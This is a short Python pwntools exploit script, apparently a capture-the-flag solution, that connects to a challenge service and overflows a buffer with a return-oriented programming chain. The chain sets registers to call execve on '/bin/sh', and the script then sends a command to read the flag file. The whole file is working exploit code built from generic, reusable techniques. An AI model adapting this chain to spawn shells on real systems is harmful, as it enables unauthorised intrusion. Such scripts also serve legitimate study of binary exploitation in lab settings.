from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

# 0x0000000000450087 : pop rax ; ret
# 0x0000000000401f0f : pop rdi ; ret
# 0x0000000000409f7e : pop rsi ; ret
# 0x0000000000485e0a : pop rax ; pop rdx ; pop rbx ; ret
# 0x0000000000498027 : /bin/sh
# 0x0000000000401cc4 : syscall


def main():
    r = remote("10.113.184.121", 10052)
    # r = process("./share/chal")
    # attach(r)
    r.recvuntil(b"> ")
    payload = flat(
        {
            0x18: [
                [0x0000000000450087, 0x3B],  #  pop rax ; ret  # rax = 0x3B, execve
                [0x0000000000401F0F, 0x0000000000498027],  # pop rdi ; ret  # /bin/sh
                [0x0000000000409F7E, 0x0],  # pop rsi ; ret
                [0x485E0B, 0x0, 0x0],  # pop rdx ; pop rbx ; ret  # rdx = 0 # rbx = 0
                0x0000000000401CC4,  # syscall
            ]
        }
    )
    nw = "\n"
    log.info(f"payload\n{payload.hex(sep=nw, bytes_per_sep=-8)}")
    # input()
    r.sendline(payload)
    r.sendline(b"cat /home/chal/flag.txt")
    print(r.recv().decode().strip())
    r.close()


if __name__ == "__main__":
    main()
